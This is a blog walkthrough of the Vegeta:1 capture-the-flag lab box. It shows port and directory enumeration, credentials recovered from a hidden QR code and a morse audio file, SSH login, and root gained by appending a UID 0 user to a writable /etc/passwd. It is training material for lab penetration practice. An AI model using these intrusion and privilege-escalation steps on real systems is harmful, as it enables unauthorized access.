---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/vegeta-1,501/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  


# discovery

Starting with a port scan to idenfity the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- 192.168.249.73
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-18 15:08 EST
Nmap scan report for 192.168.249.73
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.03 seconds
```

## gobuster
```bash
$ gobuster dir -u http://192.168.249.73/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 5 -x php,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.249.73/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/11/18 15:10:53 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 316] [--> http://192.168.249.73/admin/]
/image                (Status: 301) [Size: 316] [--> http://192.168.249.73/image/]
/img                  (Status: 301) [Size: 314] [--> http://192.168.249.73/img/]  
/index.html           (Status: 200) [Size: 119]                                   
/index.html           (Status: 200) [Size: 119]                                   
/login.php            (Status: 200) [Size: 0]                                     
/manual               (Status: 301) [Size: 317] [--> http://192.168.249.73/manual/]
/bulma                (Status: 301) [Size: 317] [--> http://192.168.249.73/bulma/]
/robots.txt           (Status: 200) [Size: 11]                                     
/robots.txt           (Status: 200) [Size: 11]                                     
                                                                                   
===============================================================
2022/11/18 15:12:45 Finished
===============================================================
```

## `robots.txt`
### request
```http
GET /robots.txt HTTP/1.1
Host: 192.168.249.73
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Date: Fri, 18 Nov 2022 20:12:29 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Sun, 28 Jun 2020 13:13:31 GMT
ETag: "b-5a924b56894c0"
Accept-Ranges: bytes
Content-Length: 11
Connection: close
Content-Type: text/plain

*
/find_me
```

## `/find_me`

![find me](/images/vegeta1_findme.png)

> Directory listing is enabled.
{: .prompt-info }

## `/find_me/find_me.html`
### request
```http
GET /find_me/find_me.html HTTP/1.1
Host: 192.168.249.73
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.249.73/find_me/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Date: Fri, 18 Nov 2022 20:12:36 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Sun, 28 Jun 2020 13:46:32 GMT
ETag: "f18-5a9252b7c3e00-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 3864
Connection: close
Content-Type: text/html

<html>
<head> Vegeta-1.0 </head>
<body></body>
</html>

...

<!-- aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== -->
```

## decoding the `base64` blob
Decoding reveals that the blob is an encoded picture.
```bash
$ base64 -d blob | base64 -d > blob.png
$ file blob.png 
blob.png: PNG image data, 200 x 200, 8-bit/color RGBA, non-interlaced
```

Opening the `png` file shows that it is a QR code.  
You can analyze QR codes with a simple `python` script to get the ASCII content of the code.
```bash
$ cat qrdecode.py 
import sys
from pyzbar.pyzbar import decode
from PIL import Image
decocdeQR = decode(Image.open(sys.argv[1]))
print(decocdeQR[0].data.decode('ascii'))
$ python3 qrdecode.py blob.png
Password : topshellv
```

> And we got a password! (`topshellv`)
{: .prompt-info }

## `/bulma`
Reveals a `wav` file which sounds like morse code.  
There are [websites](https://morsecode.world/) which analyze morse codes based on sound files.  
Analyzing the file reveals the following string.  

![morse code](/images/vegeta1_morse.png)

`U S E R : T R U N K S P A S S W O R D : U S 3 R <KN> S I N D O L L A R S S Y M B O L`  

> There seems to exist a user named `trunks` with the password `u$3r`
{: .prompt-info }

---

# exploitation

We collected different information:
- account: `trunks:u$3r`
- password: `topshellv`

## `ssh` login
Test credentials via `ssh`
```bash
$ ssh trunks@192.168.249.73                                                                                          
trunks@192.168.249.73's password: 
Permission denied, please try again.
trunks@192.168.249.73's password: 
Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
trunks@Vegeta:~$ id
uid=1000(trunks) gid=1000(trunks) groups=1000(trunks),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

> It works! We got a shell.
{: .prompt-info }

---

# post exploitation

## get first flag
```bash
trunks@Vegeta:~$ ls
local.txt
trunks@Vegeta:~$ cat local.txt 
f******************************3
trunks@Vegeta:~$
```

## privilege escalation
The file `/etc/passwd` is writeable for user `trunks` as it is owned by him.
```bash
$ ls -lsah /etc/passwd
4.0K -rw-r--r-- 1 trunks root 1.5K Jun 28  2020 /etc/passwd
```

Lets add a new entry to `/etc/passwd` to create a new `root` user.  
At first we create a password hash with the salt `new`.
```bash
$ openssl passwd -1 -salt new 123
```

Now we add the following line to the file `/etc/passwd` to add a `root` user with the name `new`.  
`new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`  
  
After we added it we can change the current user to gain `root` access.
```bash
trunks@Vegeta:~$ su new
Password: 
root@Vegeta:/home/trunks# id
uid=0(root) gid=0(root) groups=0(root)
```

> Root access!
{: .prompt-info }

## get second flag
```bash
root@Vegeta:/home/trunks# cd /root/
root@Vegeta:~# ls
proof.txt  root.txt
root@Vegeta:~# cat proof.txt 
9******************************8
```

Pwned! <@:-)
